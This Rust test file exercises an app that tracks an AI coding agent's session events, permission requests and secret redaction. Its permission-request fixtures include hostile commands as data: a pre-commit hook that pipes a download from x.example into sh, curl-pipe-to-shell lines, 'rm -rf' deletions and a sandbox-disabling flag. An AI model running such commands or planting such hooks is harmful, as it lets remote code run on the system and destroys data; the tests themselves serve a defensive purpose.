use chrono::Utc;
use harness::event::{Body, ClosedBy, Decision, Event, FailKind, QuestionEnd, TurnEnd};
use serde_json::json;

use super::*;
use crate::domain::fixtures::run_spec;
use crate::domain::{Run, RunState, SessionFollow};

struct Played {
    run: Run,
    follow: SessionFollow,
    rows: Vec<RunEvent>,
    seq: u64,
}

impl Played {
    fn new() -> Played {
        let mut run = Run::queued("r1".into(), "p1".into(), "c1".into(), None, run_spec(), Utc::now());
        run.state = RunState::Launching;
        Played { run, follow: SessionFollow::default(), rows: Vec::new(), seq: 0 }
    }

    fn play(&mut self, bodies: impl IntoIterator<Item = Body>) -> &mut Played {
        for body in bodies {
            self.seq += 1;
            let event = Event { seq: self.seq, ms: 1_700_000_000_000 + self.seq as i64, body, cut: None };
            let rows = fold(&mut self.run, &mut self.follow, &event, Utc::now());
            self.rows.extend(rows);
        }
        self
    }

    fn kinds(&self) -> Vec<&str> {
        self.rows.iter().map(|row| row.kind.as_str()).collect()
    }
}

fn started() -> Vec<Body> {
    vec![Body::Prompted { text: "the brief".into() }, Body::TurnStarted, Body::Started { provider_session: "p".into(), resumed: false }]
}

#[test]
fn a_turn_that_streams_and_ends_reads_working_then_done_with_its_timeline() {
    let mut p = Played::new();
    p.play(started());
    assert_eq!(p.run.state, RunState::Working);
    p.play([
        Body::Text { text: "Looking at the code.".into() },
        Body::ToolCall { id: "t1".into(), name: "Bash".into(), input: json!({ "command": "cargo test\nmore" }) },
        Body::ToolResult { id: "t1".into(), output: json!("ok"), error: false },
    ]);
    assert_eq!((p.run.state, p.run.last_detail.as_deref()), (RunState::Working, Some("Bash: cargo test")));
    p.play([Body::Result { data: json!({ "status": "done", "note": "All green." }) }, Body::TurnEnded { how: TurnEnd::Done }]);
    assert_eq!(p.run.state, RunState::Done);
    assert_eq!((p.run.result.as_deref(), p.run.result_complete), (Some("All green."), true));
    assert!(p.run.ended_at.is_some());
    assert_eq!(p.kinds(), ["start", "update", "run", "done", "done"], "the brief is no row, a result is");
    assert_eq!((p.follow.turns, p.follow.in_turn), (1, false));
}

#[test]
fn turns_are_counted_by_their_end_not_by_prompt() {
    let mut p = Played::new();
    p.play(started());
    p.play([Body::TurnEnded { how: TurnEnd::Done }, Body::TurnStarted, Body::Text { text: "a background task ended".into() }, Body::TurnEnded { how: TurnEnd::Done }]);
    assert_eq!((p.follow.prompts, p.follow.turns), (1, 2), "one prompt, two turns");
}

#[test]
fn a_question_waits_on_the_person_through_the_end_of_its_turn_until_it_is_answered() {
    let mut p = Played::new();
    p.play(started());
    p.play([Body::Question { id: "q1".into(), text: "Which colour?".into() }]);
    assert_eq!((p.run.state, p.run.needs.as_deref(), p.run.asking), (RunState::NeedsAnswer, Some("Which colour?"), true));
    p.play([Body::TurnEnded { how: TurnEnd::Done }]);
    assert_eq!(p.run.state, RunState::NeedsAnswer, "an open question outlasts its turn");
    assert!(p.run.ended_at.is_none());
    p.play([Body::QuestionClosed { id: "q1".into(), how: QuestionEnd::Answered }, Body::Prompted { text: "Blue".into() }, Body::TurnStarted]);
    assert_eq!((p.run.state, p.run.needs.as_deref(), p.run.asking), (RunState::Working, None, false));
    assert!(p.kinds().contains(&"follow_up"), "the answer sent as a prompt is a message");
}

#[test]
fn a_permission_request_waits_then_its_answer_goes_back_to_work() {
    let mut p = Played::new();
    p.play(started());
    p.play([Body::Permission { id: "p1".into(), kind: harness::event::PermissionKind::Command, tool: "Bash".into(), input: json!({ "command": "rm -rf build" }) }]);
    assert_eq!((p.run.state, p.run.needs.as_deref()), (RunState::NeedsPermission, Some("Wants to use Bash: rm -rf build")));
    assert_eq!(p.follow.permissions, vec![("p1".to_owned(), false, "Wants to use Bash: rm -rf build".to_owned())]);
    p.play([Body::Answered { id: "p1".into(), decision: Decision::Allow, message: None }]);
    assert_eq!((p.run.state, p.run.needs.as_deref()), (RunState::Working, None));
}

#[test]
fn a_cut_permission_request_is_kept_as_one_that_can_only_be_denied() {
    let mut p = Played::new();
    p.play(started());
    let body = Body::Permission { id: "p1".into(), kind: harness::event::PermissionKind::Command, tool: "Bash".into(), input: json!("cut") };
    let event = Event { seq: 9, ms: 0, body, cut: Some(40) };
    fold(&mut p.run, &mut p.follow, &event, Utc::now());
    assert_eq!(p.follow.permissions, vec![("p1".to_owned(), true, "Wants to use Bash … (cut)".to_owned())]);
}

#[test]
fn an_event_applied_once_is_passed_over_and_one_never_stored_moves_nothing() {
    let mut p = Played::new();
    p.play(started());
    let again = Event { seq: 2, ms: 0, body: Body::Text { text: "again".into() }, cut: None };
    assert!(fold(&mut p.run, &mut p.follow, &again, Utc::now()).is_empty());
    let unstored = Event { seq: 0, ms: 0, body: Body::Failed { kind: FailKind::Harness, reason: "the store failed".into() }, cut: None };
    fold(&mut p.run, &mut p.follow, &unstored, Utc::now());
    assert_eq!((p.run.state, p.follow.seq), (RunState::Failed, 3));
}

#[test]
fn a_stop_reads_stopped_and_a_finished_run_stays_done_when_its_session_closes() {
    let mut p = Played::new();
    p.play(started());
    p.play([Body::TurnEnded { how: TurnEnd::Cancelled }, Body::Closed { by: ClosedBy::Unknown }]);
    assert_eq!(p.run.state, RunState::Stopped);
    assert!(p.follow.closed);
    let mut done = Played::new();
    done.play(started());
    done.play([Body::TurnEnded { how: TurnEnd::Done }, Body::Closed { by: ClosedBy::Unknown }]);
    assert_eq!(done.run.state, RunState::Done);
}

#[test]
fn a_deny_that_ends_the_turn_reads_stopped_after_a_deny() {
    let mut p = Played::new();
    p.play(started());
    p.play([Body::TurnEnded { how: TurnEnd::Denied }]);
    assert_eq!((p.run.state, p.run.last_detail.as_deref()), (RunState::Stopped, Some(STOPPED_AFTER_DENY)));
}

#[test]
fn a_failure_keeps_its_reason_redacted_and_a_signed_out_login_says_so() {
    let mut p = Played::new();
    p.play(started());
    p.play([Body::Failed { kind: FailKind::SignedOut, reason: "not signed in, token sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789".into() }]);
    assert_eq!((p.run.state, p.run.failure.clone()), (RunState::Failed, Some(RunFailure::NotSignedIn)));
    assert!(!p.run.error.as_deref().unwrap().contains("abcdefghijklmnop"), "the reason is redacted");
    assert!(p.rows.iter().all(|row| !row.text.contains("abcdefghijklmnop")), "and so is its row");
}

#[test]
fn waiting_for_a_slot_says_so_until_the_turn_starts() {
    let mut p = Played::new();
    p.play([Body::Prompted { text: "the brief".into() }, Body::Waiting]);
    assert_eq!((p.run.state, p.run.last_detail.as_deref()), (RunState::Launching, Some(SLOT_WAIT)));
    p.play([Body::TurnStarted]);
    assert_eq!((p.run.state, p.run.last_detail.as_deref()), (RunState::Working, None));
}

#[test]
fn a_withheld_event_still_moves_the_run_by_what_it_kept() {
    let mut p = Played::new();
    p.play(started());
    p.play([Body::Text { text: "x".into() }.withheld(), Body::TurnEnded { how: TurnEnd::Done }.withheld()]);
    assert_eq!(p.run.state, RunState::Done, "how the turn ended is kept");
}

#[test]
fn a_hand_over_reads_handed_over() {
    let mut p = Played::new();
    p.play(started());
    p.play([Body::TurnEnded { how: TurnEnd::Cancelled }, Body::HandedOver, Body::Closed { by: ClosedBy::Unknown }]);
    assert_eq!((p.run.state, p.run.last_detail.as_deref()), (RunState::Stopped, Some(HANDED_OVER)));
}

#[test]
fn a_turn_cut_by_a_stop_the_app_asked_for_reads_stopped_and_one_nobody_asked_for_reads_stopped_without_failing() {
    let cut = || Body::Failed { kind: FailKind::AgentStopped, reason: "the agent stopped in the middle of a turn".into() };
    let mut asked = Played::new();
    asked.play(started());
    asked.follow.stop_asked = true;
    asked.play([cut(), Body::Closed { by: ClosedBy::Unknown }]);
    assert_eq!(asked.run.state, RunState::Stopped);
    assert!(asked.follow.ended, "a stop the app asked for is the end");
    let mut not = Played::new();
    not.play(started());
    not.play([cut(), Body::Closed { by: ClosedBy::Unknown }]);
    assert_eq!((not.run.state, not.run.last_detail.as_deref(), not.run.error.as_deref()), (RunState::Stopped, Some(CUT), None), "a shutdown's cut fails nothing");
    assert!(!not.follow.ended, "and can be resumed");
}

#[test]
fn a_shutdown_keeps_the_question_open_and_a_resumed_start_takes_the_session_up_again() {
    let mut p = Played::new();
    p.play(started());
    p.play([Body::Question { id: "q1".into(), text: "Which colour?".into() }]);
    p.play([Body::Failed { kind: FailKind::AgentStopped, reason: "the agent stopped in the middle of a turn".into() }, Body::Closed { by: ClosedBy::Unknown }]);
    assert_eq!((p.run.state, p.run.needs.as_deref(), p.follow.closed), (RunState::NeedsAnswer, Some("Which colour?"), true), "the question outlasts the shutdown");
    p.play([Body::Started { provider_session: "p".into(), resumed: true }]);
    assert!(!p.follow.closed && !p.follow.stop_asked);
    p.play([Body::QuestionClosed { id: "q1".into(), how: QuestionEnd::Answered }, Body::Prompted { text: "Blue".into() }, Body::TurnStarted, Body::Text { text: "Blue it is.".into() }]);
    assert_eq!((p.run.state, p.run.last_detail.as_deref()), (RunState::Working, Some("Blue it is.")));
    let mut stopped = Played::new();
    stopped.play(started());
    stopped.play([Body::TurnEnded { how: TurnEnd::Cancelled }, Body::Closed { by: ClosedBy::Unknown }, Body::Started { provider_session: "p".into(), resumed: true }, Body::Prompted { text: "carry on".into() }, Body::TurnStarted]);
    assert_eq!((stopped.run.state, stopped.run.ended_at), (RunState::Working, None), "a resumed session is followed out of Stopped");
}

#[test]
fn a_new_turn_after_a_failed_one_takes_the_run_out_of_failed_and_its_requests_show() {
    let mut p = Played::new();
    p.play(started());
    p.play([Body::Failed { kind: FailKind::Provider, reason: "overloaded".into() }]);
    assert_eq!(p.run.state, RunState::Failed);
    p.play([Body::Prompted { text: "try again".into() }, Body::TurnStarted]);
    assert_eq!((p.run.state, p.run.error.as_deref(), p.run.failure.clone()), (RunState::Working, None, None));
    p.play([Body::Question { id: "q1".into(), text: "Which colour?".into() }]);
    assert_eq!((p.run.state, p.run.needs.as_deref()), (RunState::NeedsAnswer, Some("Which colour?")));
}

#[test]
fn a_withheld_question_keeps_what_was_read_of_it_and_a_withheld_result_leaves_the_result_alone() {
    let mut p = Played::new();
    p.play(started());
    p.play([Body::Question { id: "q1".into(), text: "x".into() }.withheld()]);
    assert_eq!((p.run.state, p.run.needs.as_deref()), (RunState::NeedsAnswer, Some(NOT_KEPT)));
    p.play([Body::Question { id: "q2".into(), text: "Which colour?".into() }, Body::Question { id: "q2".into(), text: "x".into() }.withheld()]);
    assert_eq!(p.run.needs.as_deref(), Some("Which colour?"), "a question read before keeps its text");
    let mut r = Played::new();
    r.play(started());
    r.play([Body::Result { data: json!({ "status": "done", "note": "Fixed." }) }, Body::Result { data: json!({ "note": "x" }) }.withheld()]);
    assert_eq!((r.run.result.as_deref(), r.run.result_complete), (Some("Fixed."), true));
}

#[test]
fn a_call_of_the_apps_tools_waits_for_its_result_in_the_follow() {
    let mut p = Played::new();
    p.play(started());
    p.play([Body::ClientToolCall { id: "c1".into(), name: "read_ticket".into(), input: json!({ "key": "CA-1" }) }]);
    assert_eq!(p.follow.calls, vec![("c1".to_owned(), "read_ticket".to_owned(), json!({ "key": "CA-1" }))]);
    p.play([Body::ToolResult { id: "c1".into(), output: json!("ok"), error: false }]);
    assert!(p.follow.calls.is_empty());
}

#[test]
fn a_loss_names_the_events_it_skipped_and_reads_on_after_them() {
    let mut p = Played::new();
    p.play(started());
    let rows = lost(&mut p.run, &mut p.follow, "events were lost: swept", 9, Utc::now());
    assert_eq!((rows[0].text.as_str(), p.follow.seq, p.follow.lost), (format!("{LOST}: events 4 to 9 were skipped").as_str(), 9, 1));
    assert_eq!(rows[0].detail.as_deref(), Some("events were lost: swept"));
    assert_eq!(p.run.last_detail.as_deref(), Some(rows[0].text.as_str()), "on the run too, for a full timeline");
    let one = lost(&mut p.run, &mut p.follow, "again", 10, Utc::now());
    assert_eq!((one[0].text.as_str(), p.follow.lost), (format!("{LOST}: event 10 was skipped").as_str(), 2));
    let none = lost(&mut p.run, &mut p.follow, "behind", 3, Utc::now());
    assert_eq!((none[0].text.as_str(), p.follow.seq), (format!("{LOST}: no stored event was skipped").as_str(), 10), "never back");
}

#[test]
fn a_deny_that_closes_the_held_question_before_the_turn_ends_reads_stopped_after_a_deny() {
    let mut p = Played::new();
    p.play(started());
    p.play([
        Body::Question { id: "q1".into(), text: "Which colour?".into() },
        Body::QuestionClosed { id: "q1".into(), how: QuestionEnd::Denied },
        Body::TurnEnded { how: TurnEnd::Denied },
    ]);
    assert_eq!((p.run.state, p.run.needs.as_deref(), p.follow.question.as_deref()), (RunState::Stopped, None, None));
    assert_eq!(p.run.last_detail.as_deref(), Some(STOPPED_AFTER_DENY));
}

#[test]
fn a_run_shows_what_it_still_waits_on_once_one_of_its_requests_is_answered() {
    let mut p = Played::new();
    p.play(started());
    let wants = |id: &str, command: &str| Body::Permission { id: id.into(), kind: harness::event::PermissionKind::Command, tool: "Bash".into(), input: json!({ "command": command }) };
    p.play([Body::Question { id: "q1".into(), text: "Which colour?".into() }, wants("p1", "rm a"), wants("p2", "rm b")]);
    assert_eq!((p.run.state, p.run.needs.as_deref()), (RunState::NeedsPermission, Some("Wants to use Bash: rm a")), "the oldest request first");
    p.play([Body::Answered { id: "p1".into(), decision: Decision::Allow, message: None }]);
    assert_eq!(p.run.needs.as_deref(), Some("Wants to use Bash: rm b"));
    p.play([Body::Answered { id: "p2".into(), decision: Decision::Deny, message: None }]);
    assert_eq!((p.run.state, p.run.needs.as_deref()), (RunState::NeedsAnswer, Some("Which colour?")), "then the question");
}

#[test]
fn a_question_closed_by_a_clean_up_or_a_session_that_cannot_resume_waits_on_no_one_ends_the_follow_and_says_why() {
    for (how, says) in [(QuestionEnd::CleanedUp, "the run was cleaned up"), (QuestionEnd::NotResumable, "no answer can reach the agent now")] {
        let mut p = Played::new();
        p.play(started());
        p.play([Body::Question { id: "q1".into(), text: "Which colour?".into() }, Body::QuestionClosed { id: "q1".into(), how }]);
        assert_eq!((p.run.state, p.run.needs.as_deref(), p.follow.question.as_deref(), p.follow.ended), (RunState::Stopped, None, None, true), "{how:?}");
        assert!(p.rows.last().unwrap().text.ends_with(says), "{how:?}");
    }
}

#[test]
fn an_event_of_a_type_this_build_cannot_read_moves_its_number_and_nothing_else() {
    let mut p = Played::new();
    p.play(started());
    let before = p.run.clone();
    let unknown = Event { seq: 9, ms: 0, body: Body::Withheld { of: "progress".into(), kept: Default::default() }, cut: None };
    assert_eq!(unreadable(&unknown.body), Some("progress"));
    assert!(fold(&mut p.run, &mut p.follow, &unknown, Utc::now()).is_empty());
    assert_eq!((p.follow.seq, p.run.state), (9, before.state));
    assert_eq!(unreadable(&Body::Text { text: "x".into() }.withheld()), None, "a withheld event of a known type is read");
}

#[test]
fn a_permission_request_the_agent_withdrew_waits_on_no_one_and_shows_what_still_does() {
    let mut p = Played::new();
    p.play(started());
    p.play([
        Body::Question { id: "q1".into(), text: "Which colour?".into() },
        Body::Permission { id: "p1".into(), kind: harness::event::PermissionKind::Command, tool: "Bash".into(), input: json!({ "command": "rm -rf build" }) },
    ]);
    assert_eq!(p.run.state, RunState::NeedsPermission);
    p.play([Body::PermissionClosed { id: "p1".into() }]);
    assert_eq!((p.run.state, p.run.needs.as_deref(), p.follow.permissions.len()), (RunState::NeedsAnswer, Some("Which colour?"), 0), "the question shows again");
    assert!(p.rows.last().unwrap().text.starts_with("It withdrew the request"));
}

#[test]
fn a_question_closed_for_good_after_a_shutdown_leaves_needs_you_and_ends() {
    for how in [QuestionEnd::NotResumable, QuestionEnd::CleanedUp, QuestionEnd::Stopped, QuestionEnd::Other] {
        let mut p = Played::new();
        p.play(started());
        p.play([Body::Question { id: "q1".into(), text: "Which colour?".into() }, Body::TurnEnded { how: TurnEnd::Done }, Body::Closed { by: ClosedBy::Unknown }]);
        assert_eq!(p.run.state, RunState::NeedsAnswer, "{how:?}: the question outlasts the shutdown");
        p.play([Body::QuestionClosed { id: "q1".into(), how }]);
        assert_eq!((p.run.state, p.run.asking, p.run.needs.as_deref(), p.run.ended_at.is_some()), (RunState::Stopped, false, None, true), "{how:?}");
        assert_eq!(p.follow.ended, matches!(how, QuestionEnd::NotResumable | QuestionEnd::CleanedUp), "{how:?}: only those end the follow");
    }
}

#[test]
fn a_known_event_with_a_value_this_build_does_not_know_still_moves_the_run() {
    let mut p = Played::new();
    p.play(started());
    p.play([Body::Permission { id: "p1".into(), kind: PermissionKind::Other, tool: "Fetch".into(), input: json!({}) }]);
    assert_eq!((p.run.state, p.follow.permissions[0].1), (RunState::NeedsPermission, true), "a request the person can only deny");
    p.play([Body::Answered { id: "p1".into(), decision: Decision::Other, message: None }]);
    assert_eq!(p.run.state, RunState::Working);
    p.play([Body::Question { id: "q1".into(), text: "Which?".into() }, Body::QuestionClosed { id: "q1".into(), how: QuestionEnd::Other }]);
    assert_eq!((p.run.state, p.follow.question.as_deref()), (RunState::Working, None), "an unknown close closes the question");
    p.play([Body::TurnEnded { how: TurnEnd::Other }]);
    assert_eq!((p.run.state, p.follow.in_turn, p.follow.turns), (RunState::Stopped, false, 1), "an unknown end ends the turn");
    let mut f = Played::new();
    f.play(started());
    f.play([Body::Failed { kind: FailKind::Other, reason: "quota".into() }]);
    assert_eq!((f.run.state, f.run.failure.clone()), (RunState::Failed, Some(RunFailure::Other)));
}

#[test]
fn a_resumed_start_takes_up_a_session_the_app_had_stopped() {
    let mut p = Played::new();
    p.play(started());
    p.follow.stop_asked = true;
    p.play([Body::TurnEnded { how: TurnEnd::Cancelled }, Body::Closed { by: ClosedBy::Unknown }]);
    assert!(p.follow.ended);
    assert!(p.follow.stop_asked);
    p.play([Body::Started { provider_session: "p".into(), resumed: true }]);
    assert!(!p.follow.ended && !p.follow.closed, "followed again");
    assert!(!p.follow.stop_asked, "a later end of the agent is its own, not that stop's");
}

#[test]
fn an_answer_the_harness_took_reads_working_until_it_reaches_the_agent() {
    let mut p = Played::new();
    p.play(started());
    p.play([Body::Question { id: "q1".into(), text: "Which colour?".into() }, Body::TurnEnded { how: TurnEnd::Done }, Body::TurnStarted]);
    assert_eq!(p.run.state, RunState::NeedsAnswer, "a turn of its own started before the answer");
    answered(&mut p.run, &mut p.follow, "q1");
    assert_eq!((p.run.state, p.run.needs.as_deref(), p.run.last_detail.as_deref(), p.run.answer_waits), (RunState::Working, None, Some(ANSWER_WAITS), true));
    p.play([Body::Text { text: "still busy".into() }]);
    assert_eq!(p.run.state, RunState::Working, "the answered question waits on no one");
    p.play([Body::TurnEnded { how: TurnEnd::Done }]);
    assert_eq!((p.run.state, p.run.answer_waits), (RunState::Working, true), "not done while the answer is on its way");
    p.play([Body::QuestionClosed { id: "q1".into(), how: QuestionEnd::Answered }, Body::Prompted { text: "Blue".into() }, Body::TurnStarted]);
    assert_eq!((p.follow.answered.as_deref(), p.follow.question.as_deref(), p.run.answer_waits), (None, None, false));
    answered(&mut p.run, &mut p.follow, "q1");
    assert!(p.follow.answered.is_none(), "an answer to a closed question changes nothing");
}

#[test]
fn a_waiting_answer_ends_with_a_failed_turn_or_a_stop_and_outlasts_a_close_a_resume_takes_up() {
    let asked = || {
        let mut p = Played::new();
        p.play(started());
        p.play([Body::Question { id: "q1".into(), text: "Which colour?".into() }]);
        answered(&mut p.run, &mut p.follow, "q1");
        p
    };
    let mut failed = asked();
    failed.play([Body::Failed { kind: FailKind::Provider, reason: "overloaded".into() }]);
    assert_eq!((failed.run.answer_waits, failed.run.last_detail.as_deref()), (false, None));
    let mut stopped = asked();
    stopped.follow.stop_asked = true;
    stopped.play([Body::Closed { by: ClosedBy::Unknown }]);
    assert_eq!((stopped.run.state, stopped.run.answer_waits, stopped.run.last_detail.as_deref()), (RunState::Stopped, false, None));
    let mut shut = asked();
    shut.play([Body::Closed { by: ClosedBy::Unknown }]);
    assert_eq!((shut.run.state, shut.run.answer_waits, shut.run.last_detail.as_deref()), (RunState::Stopped, true, Some(ANSWER_WAITS_RESUME)));
    shut.play([Body::Started { provider_session: "p".into(), resumed: true }]);
    assert_eq!((shut.run.state, shut.run.last_detail.as_deref()), (RunState::Working, Some(ANSWER_WAITS)));
}

#[test]
fn a_tool_calls_detail_on_the_run_is_redacted_as_its_row_is() {
    let mut p = Played::new();
    p.play(started());
    p.play([Body::ToolCall { id: "t1".into(), name: "Bash".into(), input: json!({ "command": "deploy --password=hunter2secret" }) }]);
    let detail = p.run.last_detail.clone().unwrap();
    assert!(!detail.contains("hunter2secret"), "{detail}");
    assert_eq!(Some(detail.as_str()), p.rows.last().map(|row| row.text.as_str()));
}

#[test]
fn a_commit_the_signing_agent_refused_ends_the_turn_with_signing_needs_you_and_a_later_turn_clears_it() {
    let mut p = Played::new();
    p.play(started());
    let refused = "error: 1Password: Could not connect to socket. Is the agent running?\n\nfatal: failed to write commit object";
    p.play([
        Body::ToolCall { id: "t1".into(), name: "Bash".into(), input: json!({ "command": "git commit -m fix" }) },
        Body::ToolResult { id: "t1".into(), output: json!(refused), error: true },
        Body::Text { text: "I couldn't commit; signing failed.".into() },
        Body::TurnEnded { how: TurnEnd::Done },
    ]);
    assert_eq!((p.run.state, p.run.failure.clone(), p.run.error.as_deref()), (RunState::Failed, Some(RunFailure::SigningNeedsYou), Some(SIGNING_NEEDS_YOU)));
    p.play([Body::Prompted { text: "Unlocked, try again.".into() }, Body::TurnStarted, Body::TurnEnded { how: TurnEnd::Done }]);
    assert_eq!((p.run.state, p.run.failure.clone()), (RunState::Done, None), "a turn that commits clears it");
    let mut other = Played::new();
    other.play(started());
    other.play([Body::ToolResult { id: "t1".into(), output: json!("fatal: not a git repository"), error: true }, Body::TurnEnded { how: TurnEnd::Done }]);
    assert_eq!(other.run.state, RunState::Done, "any other failed command is not this");
}

fn a_lost_agent_keeps_the_question_it_asked_for_you_to_answer() {
    let mut p = Played::new();
    p.play(started()).play([Body::Question { id: "q1".into(), text: "Which colour?".into() }]);
    agent_lost(&mut p.run, &mut p.follow, Utc::now());
    assert_eq!((p.run.state, p.run.needs.as_deref(), p.run.asking), (RunState::NeedsAnswer, Some("Which colour?"), true));
    assert_eq!(p.follow.question.as_deref(), Some("q1"));
}

#[test]
fn a_stop_that_finds_the_agent_lost_ends_the_run_and_its_question() {
    let mut p = Played::new();
    p.play(started()).play([Body::Question { id: "q1".into(), text: "Which colour?".into() }]);
    p.follow.stop_asked = true;
    agent_lost(&mut p.run, &mut p.follow, Utc::now());
    assert_eq!((p.run.state, p.run.needs.as_deref(), p.run.asking), (RunState::Stopped, None, false));
    assert!(p.follow.ended && p.follow.question.is_none() && p.follow.cut.is_none(), "nothing more is followed, answered or carried on");
    assert_eq!(p.run.last_detail.as_deref(), Some(LOST_AT_STOP), "no message starts it again, so the text offers none");
}

#[test]
fn permission_the_run_lists_each_open_request_whole_in_the_order_asked_and_drops_each_as_it_closes() {
    use crate::domain::PermissionRequest;
    use harness::event::PermissionKind;
    let mut p = Played::new();
    p.play(started());
    let long = format!("git commit -m 'Blue button'\n{}", "x".repeat(400));
    let inputs = [json!({ "command": long }), json!({ "file_path": "src/cart.ts", "old_string": "a", "new_string": "b" }), json!({ "where": "here" })];
    p.play([
        Body::Permission { id: "p1".into(), kind: PermissionKind::Command, tool: "Bash".into(), input: inputs[0].clone() },
        Body::Permission { id: "p2".into(), kind: PermissionKind::FileChange, tool: "Edit".into(), input: inputs[1].clone() },
        Body::Permission { id: "p3".into(), kind: PermissionKind::Other, tool: "Fetch".into(), input: inputs[2].clone() },
    ]);
    p.seq += 1;
    let cut = Event { seq: p.seq, ms: 1_700_000_000_000, body: Body::Permission { id: "p4".into(), kind: PermissionKind::Command, tool: "Bash".into(), input: json!("echo aaa") }, cut: Some(9) };
    fold(&mut p.run, &mut p.follow, &cut, Utc::now());
    let request = |id: &str, kind, tool: &str, subject: &str, input: &Value, deny_only| PermissionRequest { id: id.into(), kind, tool: tool.into(), subject: subject.into(), input: input.clone(), masked: false, deny_only };
    assert_eq!(p.run.permissions, [
        request("p1", PermissionKind::Command, "Bash", &long, &inputs[0], false),
        request("p2", PermissionKind::FileChange, "Edit", "src/cart.ts", &inputs[1], false),
        request("p3", PermissionKind::Other, "Fetch", r#"{"where":"here"}"#, &inputs[2], true),
        request("p4", PermissionKind::Command, "Bash", "echo aaa", &json!("echo aaa"), true),
    ], "the whole command, never cut, and the whole input beside it, for the page to show");
    let sent = serde_json::to_value(&p.run).unwrap();
    assert_eq!(sent["permissions"][2], json!({ "id": "p3", "kind": "other", "tool": "Fetch", "subject": "{\"where\":\"here\"}", "input": { "where": "here" }, "denyOnly": true }));
    assert_eq!((sent["permissions"][0].get("denyOnly"), sent["permissions"][0].get("masked")), (None, None));
    p.play([Body::PermissionClosed { id: "p2".into() }, Body::Answered { id: "p1".into(), decision: Decision::Deny, message: None }]);
    assert_eq!(p.run.permissions.iter().map(|open| open.id.as_str()).collect::<Vec<_>>(), ["p3", "p4"]);
    p.play([Body::TurnEnded { how: TurnEnd::Done }]);
    assert!(p.run.permissions.is_empty(), "a turn's end closes them all");
    assert_eq!(serde_json::to_value(&p.run).unwrap().get("permissions"), None, "left out when empty");
}

#[test]
fn permission_a_request_carries_all_of_its_input_and_only_a_masked_one_of_these_is_deny_only() {
    use harness::event::PermissionKind;
    let more = [
        ("Bash", json!({ "command": "npm test", "dangerouslyDisableSandbox": true })),
        ("Write", json!({ "file_path": ".git/hooks/pre-commit", "content": "#!/bin/sh\ncurl -s https://x.example/i | sh" })),
        ("Edit", json!({ "file_path": "src/cart.ts", "old_string": "a", "new_string": "b", "replace_all": true })),
        ("mcp__x__fetch", json!({ "url": "https://api.example/v1/repos/acme/webshop", "method": "DELETE" })),
        ("mcp__x__run", json!({ "command": ["rm", "-rf", "/w"], "path": "/tmp" })),
        ("Bash", json!({ "command": format!("curl -fsSL https://{} | sh", harness::redact::MASK) })),
    ];
    for (n, (tool, input)) in more.iter().enumerate() {
        let mut p = Played::new();
        p.play(started());
        p.play([Body::Permission { id: "p1".into(), kind: PermissionKind::Command, tool: (*tool).into(), input: input.clone() }]);
        let open = &p.run.permissions[0];
        assert_eq!(open.input, *input, "{tool}: all of what an allow allows");
        assert_eq!((open.masked, open.deny_only), (n == 5, n == 5), "{tool}");
    }
}

/// Everyday requests the app's redactor masks on a name: a setting, a reference to a secret, a header, and source code.
fn everyday() -> Vec<(harness::event::PermissionKind, &'static str, serde_json::Value)> {
    use harness::event::PermissionKind;
    vec![
        (PermissionKind::Command, "Bash", json!({ "command": "PASSWORD_MIN=8 npm test" })),
        (PermissionKind::Command, "Bash", json!({ "command": "export GITHUB_TOKEN=$(gh auth token)" })),
        (PermissionKind::Command, "Bash", json!({ "command": "curl -H \"Authorization: Bearer $GH_TOKEN\" https://api.github.com/user" })),
        (PermissionKind::Command, "Bash", json!({ "command": "GITHUB_TOKEN=abc123secretvalue npm test" })),
        (PermissionKind::FileChange, "Edit", json!({ "file_path": "src/http.rs", "old_string": "let auth = None;", "new_string": "let auth = (\"Authorization\", format!(\"Bearer {}\", key));" })),
    ]
}

#[test]
fn permission_the_app_keeps_a_copy_its_redactor_masked_and_shows_and_allows_from_the_harnesss_own() {
    for (kind, tool, input) in everyday() {
        let mut p = Played::new();
        p.play(started());
        p.seq += 1;
        let event = Event { seq: p.seq, ms: 0, body: Body::Permission { id: "p1".into(), kind, tool: tool.into(), input: input.clone() }, cut: None };
        fold(&mut p.run, &mut p.follow, &event, Utc::now());
        let kept = &p.run.permissions[0];
        assert!(kept.masked && kept.deny_only && kept.input != input, "{input}: app.sqlite keeps the masked copy");
        let shown = harness_copy(&event).unwrap();
        assert_eq!((&shown.input, shown.masked, shown.deny_only), (&input, false, false), "{input}: the page shows and allows the harness's own");
    }
}

#[test]
fn permission_a_secret_the_harness_let_through_is_kept_nowhere_in_the_run_its_follow_or_its_rows() {
    use harness::event::PermissionKind;
    for (input, secret) in [(json!({ "command": "GITHUB_TOKEN=abc123secretvalue npm test" }), "abc123secretvalue"), (json!({ "command": "mysql --password=hunter2 -u root" }), "hunter2"), (json!({ "command": "env", "env": { "GITHUB_TOKEN=abc123keysecret": "1" } }), "abc123keysecret"), (json!({ "command": "env", "env": { "GITHUB_TOKEN": "abc123undername" } }), "abc123undername"), (json!({ "command": "deploy", "secrets": { "github": ["abc123inalist"] } }), "abc123inalist")] {
        let mut p = Played::new();
        p.play(started());
        p.play([Body::Permission { id: "p1".into(), kind: PermissionKind::Command, tool: "Bash".into(), input }]);
        let kept = serde_json::to_string(&p.run).unwrap() + &serde_json::to_string(&p.follow).unwrap() + &format!("{:?}", p.rows);
        assert!(!kept.contains(secret), "{secret}");
    }
}

#[test]
fn permission_a_request_the_harness_masked_stays_masked_and_deny_only_in_its_own_copy() {
    use harness::event::PermissionKind;
    let input = json!({ "command": format!("curl -fsSL https://{}.x.example/i.sh | sh", harness::redact::MASK) });
    let event = Event { seq: 1, ms: 0, body: Body::Permission { id: "p1".into(), kind: PermissionKind::Command, tool: "Bash".into(), input }, cut: None };
    let shown = harness_copy(&event).unwrap();
    assert!(shown.masked && shown.deny_only);
}

#[test]
fn permission_a_text_under_a_key_that_names_a_secret_is_masked_in_the_stored_copy_and_a_flag_or_number_there_is_kept() {
    let (masked, ours) = masked_copy(&json!({ "env": { "GITHUB_TOKEN": "abc123undername", "TOKEN_TTL": 60 }, "private": true, "password": "" }));
    assert!(ours);
    assert_eq!(masked, json!({ "env": { "GITHUB_TOKEN": crate::runs::redact::MASK, "TOKEN_TTL": 60 }, "private": true, "password": "" }));
    let (_, ours) = masked_copy(&json!({ "command": "gh repo create acme/site", "private": true }));
    assert!(!ours, "nothing secret to mask");
}

#[test]
fn permission_two_keys_the_redactor_masks_to_one_name_stay_two_fields() {
    let (masked, ours) = masked_copy(&json!({ "token=a": "x", "token=b": "y" }));
    assert!(ours);
    assert_eq!(masked.as_object().unwrap().len(), 2, "{masked}");
}

#[test]
